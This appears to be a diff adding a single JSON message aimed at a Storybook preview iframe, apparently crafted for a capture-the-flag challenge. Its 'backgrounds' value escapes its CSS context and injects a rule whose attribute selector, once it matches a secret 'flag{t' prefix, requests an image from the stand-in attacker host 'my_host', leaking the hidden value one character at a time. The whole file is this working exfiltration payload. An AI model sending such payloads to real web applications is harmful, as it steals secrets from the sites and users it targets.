@@ -1,0 +1,15 @@
+{
+  "key": "storybook-channel",
+  "event": {
+    "source": "preview",
+    "type": "updateGlobals",
+    "args": [{
+      "globals": {
+        "backgrounds": {
+          "value": "aaa} #secret[data-flag^='flag{t'] {background-image: url('http://my_host/cc'); "
+        }
+      },
+      "options": { "target": "storybook-preview-iframe" }
+    }]
+  }
+}
